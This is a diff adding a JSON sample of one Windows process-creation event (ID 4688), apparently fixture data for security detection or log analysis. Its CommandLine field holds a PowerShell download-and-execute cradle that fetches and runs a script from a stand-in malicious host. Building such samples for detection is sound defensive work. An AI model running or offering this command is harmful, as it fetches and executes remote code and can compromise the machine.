@@ -1,0 +1,14 @@
+[
+  {
+    "EventID": 4688,
+    "TimeCreated": "2024-03-07T10:15:30.123456Z",
+    "ComputerName": "WIN-SEC01",
+    "ProcessName": "powershell.exe",
+    "CommandLine": "powershell.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-site.com/payload.ps1')\"",
+    "ParentProcessName": "explorer.exe",
+    "SubjectUserName": "admin",
+    "SubjectDomainName": "CORP",
+    "TargetUserName": "SYSTEM",
+    "TargetDomainName": "NT AUTHORITY"
+  }
+]
